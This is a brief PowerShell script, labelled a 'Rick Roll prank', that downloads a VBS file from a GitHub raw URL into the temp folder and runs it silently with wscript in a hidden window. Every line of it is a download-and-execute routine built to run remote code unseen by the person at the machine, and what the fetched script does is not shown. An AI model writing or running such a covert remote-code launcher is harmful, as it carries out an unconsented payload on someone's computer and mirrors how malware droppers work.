# Rick Roll Prank - Download and Execute
# This script downloads the VBS file from GitHub and runs it silently

# Download the VBS file from GitHub
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/rickroll.vbs' -OutFile $env:temp\rickroll.vbs

# Execute the VBS file silently in the background
Start-Process wscript -ArgumentList '//B',$env:temp\rickroll.vbs -WindowStyle Hidden
